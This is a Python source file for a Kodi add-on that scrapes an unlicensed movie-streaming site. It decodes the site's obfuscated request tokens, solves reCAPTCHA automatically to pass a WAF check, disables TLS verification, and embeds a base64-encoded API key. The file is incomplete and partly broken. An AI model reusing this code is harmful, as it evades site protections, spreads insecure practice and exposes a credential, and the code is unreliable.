# -*- coding: UTF-8 -*-

import sys, os, re, json, base64
if sys.version_info >= (3,0,0):
# for Python 3
    to_unicode = str
    from resources.lib.cmf3 import parseDOM
    from resources.lib.cmf3 import replaceHTMLCodes
    from urllib.parse import unquote, parse_qs, parse_qsl, quote, urlencode, quote_plus

else:
    # for Python 2
    to_unicode = unicode
    from resources.lib.cmf2 import parseDOM
    from resources.lib.cmf2 import replaceHTMLCodes
    from urllib import unquote, quote, urlencode, quote_plus
    from urlparse import parse_qsl, parse_qs
    
import io

from resources.lib import recaptcha_v2

import xbmc, xbmcvfs

import requests
import xbmcgui
import xbmcplugin
import xbmcaddon

import resolveurl 

#urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
base_url = sys.argv[0]
addon_handle = int(sys.argv[1])
params = dict(parse_qsl(sys.argv[2][1:]))
addon = xbmcaddon.Addon(id='plugin.video.fmoviesto')

PATH            = addon.getAddonInfo('path')
try:
    DATAPATH        = xbmcvfs.translatePath(addon.getAddonInfo('profile'))
except:
    DATAPATH    = xbmc.translatePath(addon.getAddonInfo('profile')).decode('utf-8')
    
if not os.path.exists(DATAPATH):
    os.makedirs(DATAPATH)
    
jfilename = os.path.join(DATAPATH,'jfilename')
napisy = os.path.join(DATAPATH,'napisy')

RESOURCES      = PATH+'/resources/'

FANART=RESOURCES+'fanart.jpg'
mainurl = 'https://fmoviesz.to'
exlink = params.get('url', None)
nazwa= params.get('title', None)
rys = params.get('image', None)
page = params.get('page',[1])[0]


fsortv = addon.getSetting('fsortV')
fsortn = addon.getSetting('fsortN') if fsortv else 'default'

fkatv = addon.getSetting('fkatV')
fkatn = addon.getSetting('fkatN') if fkatv else 'all'

fkrajv = addon.getSetting('fkrajV')
fkrajn = addon.getSetting('fkrajN') if fkrajv else 'all'

frokv = addon.getSetting('frokV')
frokn = addon.getSetting('frokN') if frokv else 'all'

fwerv = addon.getSetting('fwerV')
fwern = addon.getSetting('fwerN') if fwerv else 'all'

fnapv = addon.getSetting('fnapV')
fnapn = addon.getSetting('fnapN') if fnapv else 'all'

fratyv = addon.getSetting('fratyV')
fratyn = addon.getSetting('fratyN') if fratyv else 'all'

sratyv = addon.getSetting('sratyV')
sratyn = addon.getSetting('sratyN') if sratyv else 'all'

snapv = addon.getSetting('snapV')
snapn = addon.getSetting('snapN') if snapv else 'all'

ssortv = addon.getSetting('ssortV')
ssortn = addon.getSetting('ssortN') if ssortv else 'default'

skatv = addon.getSetting('skatV')
skatn = addon.getSetting('skatN') if skatv else 'all'

skrajv = addon.getSetting('skrajV')
skrajn = addon.getSetting('skrajN') if skrajv else 'all'

srokv = addon.getSetting('srokV')
srokn = addon.getSetting('srokN') if srokv else 'all'

swerv = addon.getSetting('swerV')
swern = addon.getSetting('swerN') if swerv else 'all'

dataf =  addon.getSetting('fdata')  
datas =  addon.getSetting('sdata')  

wybornapisow = True

UA='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0'

headers = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'pl,en-US;q=0.7,en;q=0.3',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'TE': 'Trailers',
}
sess = requests.Session()
def build_url(query):
    return base_url + '?' + urlencode(query)

def add_item(url, name, image, mode, folder=False, IsPlayable=False, infoLabels=False, movie=True,itemcount=1, page=1,fanart=FANART,moviescount=0):
    list_item = xbmcgui.ListItem(label=name)

    if IsPlayable:
        list_item.setProperty("IsPlayable", 'True')
    if not infoLabels:
        infoLabels={'title': name,'plot':name}
    list_item.setInfo(type="video", infoLabels=infoLabels)  
    list_item.setArt({'thumb': image, 'poster': image, 'banner': image, 'icon': image, 'fanart': FANART})
    ok=xbmcplugin.addDirectoryItem(
        handle=addon_handle,
        url = build_url({'mode': mode, 'url' : url, 'page' : page, 'moviescount' : moviescount,'movie':movie,'title':name,'image':image}),          
        listitem=list_item,
        isFolder=folder)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok
    
def menuMovies():
    add_item(mainurl+'/filter?keyword=&type[]=movie', 'List movies', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+fsortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fsort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+fkrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+fkatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fkat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+frokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:frok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+fwern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fwer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+fratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:fraty', folder=False,fanart='')
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    add_item('f', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)

    xbmcplugin.endOfDirectory(addon_handle)
    
def menuTVshows():
    add_item(mainurl+'/filter?keyword=&type[]=tv', 'List tv-series', 'DefaultMovies.png', "listmovies", True) 
    add_item('', "-   [COLOR lightblue]sort:[/COLOR] [B]"+ssortn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:ssort', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]country:[/COLOR] [B]"+skrajn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skraj', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]genre:[/COLOR] [B]"+skatn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:skat', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]year:[/COLOR] [B]"+srokn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:srok', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]quality:[/COLOR] [B]"+swern+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:swer', folder=False,fanart='')
    add_item('', "-   [COLOR lightblue]rating:[/COLOR] [B]"+sratyn+'[/B]','DefaultRecentlyAddedMovies.png', 'filtr:sraty', folder=False,fanart='')
    
    
    add_item('s', "[I][COLOR violet][B]Reset all filters[/COLOR][/I][/B]",'DefaultAddonService.png', "resetfil", folder=False)
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  
    xbmcplugin.endOfDirectory(addon_handle)
def home():
    try:
        if addon.getSetting('pic')!='1':
            ResetAllFilters()
    except:
        pass
    add_item(mainurl+'/movies', 'Movies', 'DefaultMovies.png', "menumov", True)   
    add_item(mainurl+'/movies', 'TV-Series', 'DefaultMovies.png', "menutvs", True)    
    add_item('', '[COLOR lightblue]Search[/COLOR]', 'DefaultAddonsSearch.png', "search", True)  

    xbmcplugin.endOfDirectory(addon_handle)
    
def ResetAllFilters()   :
    for x in ['f','s']:
        addon.setSetting(x+'sortN','default')
        addon.setSetting(x+'sortV','&sort=default')
        
        addon.setSetting(x+'katN','all')
        addon.setSetting(x+'katV','')
        
        addon.setSetting(x+'krajN','all')
        addon.setSetting(x+'krajV','')
        
        addon.setSetting(x+'rokN','all')
        addon.setSetting(x+'rokV','')
        
        addon.setSetting(x+'napN','all')
        addon.setSetting(x+'napV','')
        
        
        addon.setSetting(x+'ratyN','all')
        addon.setSetting(x+'ratyV','')
        
        addon.setSetting(x+'data','&sort=default')
        addon.setSetting('pic','1')
        return
def ListMovies(exlink,page):

    links, serials, pagin = getMovies(exlink,page)

    itemz=links
    items = len(links)
    mud='getLinks'
    fold=True
    for f in itemz:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items, IsPlayable=False)   
    itemzx=serials
    items = len(serials)
    mud='getseasons'
    fold=True
    for f in itemzx:
        add_item(name=f.get('title'), url=f.get('href'), mode=mud, image=f.get('img'), folder=fold, infoLabels={'plot':f.get('title'),'title':f.get('title')}, itemcount=items) 
    
    if pagin:
        add_item(name='[COLOR blue]>> Next page [/COLOR]', url=exlink, mode='listmovies', image='', folder=True, page=pagin)
    if links or serials:
        xbmcplugin.setContent(addon_handle, 'videos')   

        xbmcplugin.endOfDirectory(addon_handle)     

def getMovies(url,page=1):

    #if not 'search?keyword' in url:
    if '?keyword=&' in url:
        datax = datas if '=tv' in url else dataf
    
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +datax+ '&page=%d' %int(page)
    else:
        if '&page=' in url:
        
            url = re.sub('\&page=\\d+','&page=%d'%int(page),url)
        else:
        
            url = url +'&page=%d' %int(page)
    
    nturl = '&amp;page=%d"' %(int(page)+1) 
    #xbmc.log('urlurlurlurlurlurlurlurlurlurlurl: %s'%str(url), level=xbmc.LOGINFO)
    r = sess.get(url,verify=False, headers=headers)
    html=r.content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    out=[]
    serout=[]

    npage=False

    pagination = parseDOM(html, 'ul', attrs={'class': "pagination"}) 
    if pagination:
        npage = str(int(page)+1)if nturl in pagination[0] else False

    result = parseDOM(html, 'div', attrs={'class': "movies\s+.*?"}) [0]
    ids = [(a.start(), a.end()) for a in re.finditer('<div class="item"', result)]
    ids.append( (-1,-1) )
    out=[]
    serout=[]
    for i in range(len(ids[:-1])):
        link = result[ ids[i][1]:ids[i+1][0] ]
        try:
            imag= parseDOM(link, 'img', ret='src')[0]
        except:
            imag= parseDOM(link, 'img', ret='data-src')[0]
        imag = 'https:'+imag if imag.startswith('//') else imag
        title= parseDOM(link, 'a')[-1]
        
        href = parseDOM(link, 'a', ret='href')[-1]
        id =re.findall('([^\-]+$)',href)[0]
        href = mainurl+href if href.startswith('/') else href
        typ = parseDOM(html, 'i', attrs={'class': "type"})
        typ = typ[0].strip() if typ else ''
            
        
        
        
        plot =''

        ploturl = re.findall('data\-tip\s*=\s*"(.+?)"',link)[0]
        ploturl = mainurl+'/ajax/film/tooltip/'+ ploturl
        genre =''
        code =''
        year =''
        meta = parseDOM(link, 'div', attrs={'class': "meta"})[0]
        try:
            year = re.findall('(\d{4})', meta)[0]
        except:
            year = ''

        if '.to/tv/' in href:
            # title = title + ' [COLOR gold](serie)[/COLOR]'
            serout.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
        else:
            title = '{} ({})'.format(title,year)
            out.append({'title':PLchar(title),'href':href+'|'+id,'img':imag,'plot':PLchar(plot),'genre':genre,'year':year,'code':code})
    return (out,serout, npage) 
    
def endEN(t, n) :
    return t + n;

def rLMxL(t, n):
    return t < n;

def VHtgA (t, n) :
    return t % n;

def DxlFU(t, n) :
    return rLMxL(t, n);

def dec2(t, n) :
    o=[]
    s=[]
    u=0
    h=''
    for e in range(256):
        s.append(e)

    for e in range(256):
        u = endEN(u + s[e],ord(t[e % len(t)])) % 256
        o = s[e];
        s[e] = s[u];
        s[u] = o;
    e=0
    u=0
    c=0
    for c in range(len(n)):
        e = (e + 1) % 256
        o = s[e]
        u = VHtgA(u + s[e], 256)
        s[e] = s[u];
        s[u] = o;
        try:
            h += chr((n[c]) ^ s[(s[e] + s[u]) % 256]);
        except:
            h += chr(ord(n[c]) ^ s[(s[e] + s[u]) % 256]);
    #print (h)
    return h

def getVerid(id):
###### 12.07.23     
    def convert_func(matchobj):
        m =  matchobj.group(0)

        if m <= 'Z':
            mx = 90
        else:
            mx = 122
        mx2 = ord( m)+ 13  
        if mx>=mx2:
            mx = mx2
        else:
            mx = mx2-26
        gg = chr(mx)
        return gg


    def butxx(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 6 == 1):
                    u += 5
                else:
                    if (s % 6 == 5):
                        u -= 6
                    else:
                        if (s % 6 == 0 or s % 6 == 4):
                            u += 6
                        else:
                            if not (s % 6 != 3 and s % 6 != 2):
                                u -= 5
            o += chr(u) 
            
            
    def but(t):
        o=''
        for s in range(len(t)):
            u = ord(t[s]) 
            if u==0:
                u=0
            else:
                if (s % 5 == 1 or s % 5 == 4):
                    u -= 2
                else:
                    if (s % 5 == 3):
                        u += 5;
                    else:
                        if s % 5 == 0 :
                            u -= 4;
                        else:
                            if s % 5 == 2 :
                                u -= 6
            o += chr(u) 
            
            
            
        if sys.version_info >= (3,0,0):
            o=o.encode('Latin_1')

        if sys.version_info >= (3,0,0):
            o=(o.decode('utf-8'))

        return o
    ab = 'DZmuZuXqa9O0z3b7' #####stare
    ab = 'MPPBJLgFwShfqIBx'
    ab = 'rzyKmquwICPaYFkU'
    ab = 'FWsfu0KQd9vxYGNB'
    ac = id
    hj = dec2(ab,ac) #

    if sys.version_info >= (3,0,0):
        hj=hj.encode('Latin_1')

    hj2 = encode2(hj)   

    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
    hj2 = re.sub("[a-zA-Z]", convert_func, hj2) 
    if sys.version_info >= (3,0,0):
        hj2=hj2.encode('Latin_1')
    
    

    
    
    hj2 = encode2(hj2)   
    if sys.version_info >= (3,0,0):
        hj2=(hj2.decode('utf-8'))
        

    xc= but(hj2) 

    return xc
        
def getLinks(exlink):
    href,id = exlink.split('|')

    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
    if idx:
    
        result = parseDOM(html, 'section', attrs={'id': "w\-info.*?"})[0]  
        plot = parseDOM(result, 'div', attrs={'class': "description\s*cts.*?"}) 
        plot = PLchar(plot[0]) if plot else ''
        plot = re.sub("<[^>]*>","",plot)
        imag = parseDOM(result, 'img', ret='src')
        imag = imag[0] if imag else ''
        imag = 'https:'+imag if imag.startswith('//') else imag
        
        genres = re.findall('Genre\:(.+?)<\/div>',result)
        genres = genres[0] if genres else ''
        
        gg = re.findall('>([^<]+)<\/a>',genres)
        genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
        
        countries = re.findall('Country\:(.+?)<\/div>',result)  
        countries = countries[0] if countries else ''
        cc = re.findall('>([^<]+)<\/a>',countries)
        country = ', '.join([x.strip() for x in cc]) if gg else ''
        
        tim = re.findall('span>(\d+)\s*min<',result)
        tim = int(tim[0])*60 if tim else ''
        
        
        
        qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
        qual = qual[0].strip() if qual else ''
        
        yr = parseDOM(result, 'span', attrs={'itemprop': "dateCreated"})  
        yr = yr[0].strip() if yr else ''
        infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
        
        headers.update({'Referer': href})

        if '.to/tv/' in href:
            verid = getVerid(id)
        else:
            
            idx = re.findall('class\s*=\s*"watch".*?data\-id\s*=\s*"([^"]+)',html,re.DOTALL)

            verid = getVerid(idx[0])
            params = (
            
                ('vrf', verid),
            
            )
            response = sess.get(mainurl+'/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)

            html= (response.content)
    
            if sys.version_info >= (3,0,0):
                html = html.decode(encoding='utf-8', errors='strict')
            html= html.replace('\\"','"')   
            idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)
        
            verid = getVerid(idx[0])
        recap="03AGdBq25eDJkrezDo2y"

        params = (

            ('vrf', verid),

        )
        if '.to/tv/' in href:
            response = sess.get(mainurl+'/ajax/server/list/'+id, headers=headers, params=params, verify=False)
        else:
            response = sess.get(mainurl+'/ajax/server/list/'+idx[0], headers=headers, params=params, verify=False)

        html= (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        if 'sitekey=' in html:
        
            sitek=re.findall('data\-sitekey="(.+?)"',html)[0]
        
            token = recaptcha_v2.UnCaptchaReCaptcha().processCaptcha(sitek, lang='en')
        
            data = {
                    'g-recaptcha-response': token}
            
            response = sess.post(mainurl+'/waf-verify', headers=headers, data=data, cookies=sess.cookies, verify=False)
            
            params = (
                ('id', id),
                ('token', token),
            )
            response = sess.get(mainurl+'/ajax/film/servers', headers=headers, params=params, cookies=response.cookies, verify=False)
        
        html = (response.content)
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')

        linki = re.findall('data\-link\-id\s*=\s*"([^"]+).*?<span>([^<]+)',html)
        for linkid1,host in linki:
            tyt = nazwa+' - [I][COLOR khaki]'+host+'[/I] '+' [B][/COLOR][/B]'

            add_item(name=tyt, url=linkid1+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)
        
        
        
        
        if len(linki)>0:
        
            xbmcplugin.setContent(addon_handle, 'videos')
            xbmcplugin.endOfDirectory(addon_handle) 
        else:
            xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)
        
def dec(chra):
    excludelist = ['\\xc4\\x99', '\\xc5\\x82', '\\xc5\\x81','\\xc4\\x98','\\xc5\\x9b','\\xc5\\x9a']
    
    try:    
        if sys.version_info >= (3,0,0):

            chra =repr(chra.encode('utf-8'))

            if any(exclude in chra for exclude in excludelist):
            
                return False
            chra = chra.replace('\\xc3\\xaa','ę').replace('\\xc3\\x8a','Ę')

            chra = chra.replace('\\xc3\\xa6','ć').replace('\\xc3\\x86','Ć')
            
            chra = chra.replace('\\xc2\\xbf','ż').replace('\\xc2\\x9f','Ż')
            
            chra = chra.replace('\\xc2\\xb9','ą').replace('\\xc2\\x99','Ą')
            
            chra = chra.replace('\\xc5\\x93','ś').replace('\\xc5\\x92','Ś')
            chra = chra.replace('\\xc3\\xb3','ó').replace('\\xc3\\x93','Ó')
            
            chra = chra.replace('\\xc5\\xb8','ź').replace('\\xc5\\xb7','Ź')
            
            chra = chra.replace('\\xc2\\xb3','ł').replace('\\xc2\\x93','Ł')
            
            chra = chra.replace('\\xc3\\xb1','ń').replace('\\xc3\\x91','Ń')
            

            
            chra = chra .replace("b\'",'')

            chra = chra .replace("\\n",'\n').replace("\\r",'\r') 
            chra = chra .replace("\\'","'")

        else:

            chra = chra.replace('\xc3\xaa','ę').replace('\xc3\x8a','Ę')
            chra = chra.replace('\xc3\xa6','ć').replace('\xc3\x86','Ć')
            chra = chra.replace('\xc2\xbf','ż').replace('\xc2\x9f','Ż')
            chra = chra.replace('\xc2\xb9','ą').replace('\xc2\x99','Ą')
            
            chra = chra.replace('\xc5\x93','ś').replace('\xc5\x92','Ś')
            chra = chra.replace('\xc3\xb3','ó').replace('\xc3\x93','Ó')
            
            chra = chra.replace('\xc5\xb8','ź').replace('\xc5\xb7','Ź')
            
            chra = chra.replace('\xc2\xb3','ł').replace('\xc2\x93','Ł')
            
            chra = chra.replace('\xc3\xb1','ń').replace('\xc3\x91','Ń')



    except:
        pass
        
    return chra
    
def transPolish(subtlink):

    try:
        response = sess.get(subtlink, headers=headers, verify=False)

        if sys.version_info >= (3,0,0):
        
            response  = response.text
        else:
            response  = response.content
        gg=dec(response)

        open(napisy, 'w').write(gg)

        return True
    except:
        return False
    
def PlayLink(exlink):
    id,href = exlink.split('|')
    
    verid = getVerid(id)
    
    params = (
        ('vrf', verid),
    )
    
    headers.update({'Referer': href})
    
    response = sess.get(mainurl+'/ajax/server/'+id, headers=headers, params=params, verify=False)
    
    ab=response.content
    if sys.version_info >= (3,0,0):
        ab = ab.decode(encoding='utf-8', errors='strict')
    
    
    try:
        jsonab = json.loads(ab)
    except:
        pass
    if jsonab:
        url = jsonab.get('result',None).get('url',None)
    
    link2 = DecodeLink(url)
    regs = ['?sub.info=', '&sub.info=', '?subtitle_json=', '&subtitle_json=']
    for x in regs:
        if x in link2:
            reg = x
            break
    try:
        link,subt = link2.split(reg)
    except:
        link = link2
        subt = ''
    
    subsout=[]
    
    subtx = unquote(subt)
    subt = False
    if subtx:
        if '&t=' in subtx:
            dd,dd2 = subtx.split('&t=')
            dd2 = quote_plus(dd2)
            subtx = dd+'&t='+dd2
        response = sess.get(subtx, headers=headers, verify=False).json()
    
        for subtitle in response:
            subt = subtitle.get('src',None)
            subt2 = subtitle.get('file',None)
            subt = subt if subt else subt2
            label = subtitle.get('label',None)
            if label.lower() == 'greek':
                label = 'Ελληνικά'
                subsout.insert(0, {'label':label,'subt':subt})
            else:
                subsout.append({'label':label,'subt':subt})
    if wybornapisow and subsout:
        labels = [x.get('label') for x in subsout]
        sel = xbmcgui.Dialog().select('Subtitle language',labels)   
        if sel>-1:
            subt=subsout[sel].get('subt')
            if subsout[sel].get('label') == 'Polish':
            
                subt = napisy if transPolish(subt) else subt
                
        else:
            subt = False

    #if 'vidstream' in link2 or 'mcloud' in link2 or 'vidsite' in link2:
    if 'vidplay' in link2 or 'mcloud' in link2:# in link2 or 'vidsite' in link2:
        stream_url = decodeVidstream(link2)
    
    
    else:
        try:
            stream_url = resolveurl.resolve(link)
        except Exception as som:
            xbmcgui.Dialog().notification('[B]Error[/B]', str(som),xbmcgui.NOTIFICATION_INFO, 8000,False)
            quit()
    
    if stream_url:
        
        play_item = xbmcgui.ListItem(path=stream_url)
    
        if subt:
            play_item.setSubtitles([subt])
        xbmcplugin.setResolvedUrl(addon_handle, True, listitem=play_item)
        
def decodeVidstream(query):

# ============== function taken aniyomi-extensions - from 9anime extension ================



    SubTitle = query.split('?')[1]
    aniyomi = base64.b64decode('OTNkNDQyMzI3NTU0NGZmMDhlN2I4MjdkNmRlNTRlMmY=').decode('utf8',errors='ignore')
    #action = "rawVizcloud" if 'vidstream' in query else "rawMcloud"
    
    
    action = "rawVizcloud" if 'vidplay' in query else "rawMcloud"
    
    referer = 'https://vidstream.pro/' if 'vidstream' in query else "https://mcloud.to/"
     #   else:
    #            referer = "https://mcloud.to/"
    referer = 'https://vidplay.site/' if 'vidplay' in query else "https://mcloud.to/"
    #https://vidplay.site/views/4221019

    #action = "rawMcloud"
    if 'vidplay' in query:
        query = query.split('/e/')[1].split('?')[0]
    else:
        query = query.split('e/')[1].split('?')[0]
    
    reqURL = 'https://9anime.eltik.net/'+action+'?query='+query+'&apikey='+aniyomi
    
    #futoken = sess.get("https://vidstream.pro/futoken", verify=False)
    futoken = sess.get("https://vidplay.site/futoken", verify=False)
    futoken = futoken.text

    rawSource = sess.post(reqURL, headers={"Content-Type": "application/x-www-form-urlencoded"}, data={"query": query, "futoken": futoken}, verify=False)
    rawSource= rawSource.text
    xbmc.log('rawSourcerawSourcerawSourcerawSourcerawSourcerawSource: %s'%str(rawSource), level=xbmc.LOGINFO)
    
    next_url =''
    link = ''
    if '"rawURL"' in rawSource:
        jsdata = json.loads(rawSource)
        next_url = jsdata.get('rawURL', None)

    if next_url:
        ff = requests.get(next_url+'?'+SubTitle, headers={'Referer':referer}, verify=False).text
        if 'status":200' in ff:
            srcs = (json.loads(ff)).get('result',None).get('sources',None)
            for src in srcs:
                fil = src.get('file',None)
                if 'm3u8' in fil:
                    link = fil+'|User-Agent='+UA+'&Referer='+referer
                    break

    return link
    
def DecodeLink(mainurl):
    mainurl = mainurl.replace('_', '/').replace('-', '+')
    #
    ab=mainurl[0:6]   #23.09.21
    ac2 = mainurl[6:]   #23.09.21
    ac2 = mainurl#[6:]  #23.09.21
    
    
    
    #ab = 'DZmuZuXqa9O0z3b7'
    ab= 'hlPeNwkncH0fq9so'
    ab = '8z5Ag5wgagfsOuhz'
    
    ac= decode2(mainurl)
    
    link = dekoduj(ab,ac)
    link = unquote(link)
    return link


    
def getFileJson():

    from contextlib import closing
    from xbmcvfs import File
    
    with closing(File(jfilename)) as f:
        jsondata = f.read()
        
    jsondata = json.loads(jsondata)

    html =   jsondata.get('result',None)
    return html


def getLinksSerial(hrefx):

    href,servid = hrefx.split('|')

    html = sess.get(href, headers=headers, verify=False).content
    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    
    result = parseDOM(html, 'section', attrs={'id': "w\-info"})[0] 
    plot = parseDOM(result, 'div', attrs={'class': "description.*?"})
    
    mname = parseDOM(result, 'h1', attrs={'itemprop': "name","class":"name"}) 
    mname = '[B]'+mname[0]+'[/B] ' if mname else ''
    
    plot = mname+'[CR]'+plot[0] if plot else ''
    imag = parseDOM(result, 'img', ret='src')
    imag = imag[0] if imag else ''
    imag = 'https:'+imag if imag.startswith('//') else imag
    
    genres = re.findall('Genre\:(.+?)<\/div>',result)
    genres = genres[0] if genres else ''
    
    gg = re.findall('>([^<]+)<\/a>',genres)
    genre = ', '.join([(x.strip()).lower() for x in gg]) if gg else ''
    
    countries = re.findall('Country\:(.+?)<\/div>',result) 
    countries = countries[0] if countries else ''
    cc = re.findall('>([^<]+)<\/a>',countries)
    country = ', '.join([x.strip() for x in cc]) if gg else ''
    
    tim = re.findall('span>(\d+)\s*min<',result)
    tim = int(tim[0])*60 if tim else ''
    
    
    
    qual = parseDOM(result, 'span', attrs={'class': "quality"}) 
    qual = qual[0].strip() if qual else ''
    
    yr = parseDOM(result, 'span', attrs={'class': "year"})  
    yr = yr[0].strip() if yr else ''
    infol = {'plot':plot,'genre': genre,'country':country,'duration':tim,'year':yr}
    
    
    servid = 1
    try:
        href1,serwery = re.findall("""href="([^"]+)"\\n\s*data-kname="%s".*?data\-ep=\\'({.*?)}"""%(hrefx),htmlx,re.DOTALL)[0]
    except:
        servid = 0

    href = mainurl+href1 if href1.startswith('/') else href1

    linki = re.findall('data-id="([^"]+).*?<div>([^<]+)',htmlx,re.DOTALL)
    
    
    
    
    
    
    
    
    nazwax = '- '+nazwa if mname else nazwa
    
    for linkid1,host in linki:
        tyt = mname + nazwax+' - [I][COLOR khaki]'+host+'[/I][/COLOR] '
    
        linkid = re.findall(linkid1+'"\:"([^"]+)',serwery)
        if linkid:
            add_item(name=tyt, url=linkid[0]+'|'+href, mode='playlink', image=imag, folder=False, infoLabels=infol, IsPlayable=True)

    if servid:
        xbmcplugin.setContent(addon_handle, 'videos')
        xbmcplugin.endOfDirectory(addon_handle) 
    else:
        xbmcgui.Dialog().notification('[B]Error[/B]', 'Links are not available.',xbmcgui.NOTIFICATION_INFO, 8000,False)

def ListEpisodes(exlink):

    links= getEpisodes(exlink)  
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getLinks', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getEpisodes(href):
    seaz,serv = href.split('|')

    html =   getFileJson() 

    episodes = parseDOM(html,'ul', attrs={'class': "episodes",'data\-season': str(seaz)})[0] 
    
    
    
    out=[]

    epizody = parseDOM(episodes, 'li')

    for epi in epizody:

        kname = re.findall('data\-id\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]

        seas = 'S%02d'%int(seaz)
        epis = re.findall('data\-num\s*=\s*"([^"]+)"',epi,re.DOTALL)[0]
        try:
            episod = 'E%02d'%int(epis)
        except:
            episod = 'E-%s'%str(epis)

        title = re.findall('span>\s*<span>([^<]+)',epi,re.DOTALL)
        if title:
            title = re.sub("<[^>]*>","",title[0].strip())
        else:
            title = nazwa.split('-')[-1]
        title = title+' ('+seas+episod+')'
        href = parseDOM(epi, 'a', ret='href')[-1]
        href = mainurl+href if href.startswith('/') else href
        
        out.append({'title':title ,'href':href+'|'+kname,'img':rys})

    return out
def ListSeasons(exlink):

    links= getSerial(exlink)    
    items = len(links)
    for f in links:
        add_item(name=f.get('title'), url=f.get('href'), mode='getEpisodes', image=f.get('img'), folder=True, infoLabels= {'plot':nazwa}, itemcount=items, IsPlayable=False)
    xbmcplugin.setContent(addon_handle, 'files')    

    xbmcplugin.endOfDirectory(addon_handle) 
    
def getSerial(href):

    out=[]
    href,id = href.split('|')

    headers.update({'Referer': href})
    html = sess.get(href, headers=headers, verify=False).content

    if sys.version_info >= (3,0,0):
        html = html.decode(encoding='utf-8', errors='strict')
    idx=re.findall('data\-id\s*=\s*"([^"]+)"',html,re.DOTALL)#[0]
    #i#f idx:
    recap =      addon.getSetting('cap_token')
    if not recap:
    
    
        recap="03AGdBq25eDJkrezDo2y"

    if idx:
        verid = getVerid(idx[0])    

        params = (
            ('vrf', verid),
        
        )

        response = sess.get(mainurl+'/ajax/episode/list/'+idx[0], headers=headers, params=params, verify=False)
        

        html = (response.content)
        
        if sys.version_info >= (3,0,0):
            html = html.decode(encoding='utf-8', errors='strict')
        html= html.replace('\\"','"')
        

        jsondata = response.json()
        
        with io.open(jfilename, 'w', encoding='utf8') as f:
            str_ = json.dumps(jsondata,
                indent=4, sort_keys=True,
                separators=(',', ': '), ensure_ascii=False)
            f.write(to_unicode(str_))
        
        html = jsondata.get('result',None)

        sezony = parseDOM(html, 'div', attrs={'class': "head"})[0]
        
        
        
        sezonyx = re.findall('<a(.*?<)\/a>',sezony,re.DOTALL)

        for sez in sezonyx:
            sesid,title = re.findall('data\-season\s*=\s*"([^"]+)"\s*>([^<]+)<',sez,re.DOTALL)[0]

            servers = ''
            out.append({'title':title+nazwa,'href':sesid+'|'+servers,'img':rys})
    return out
    

try:
    import string
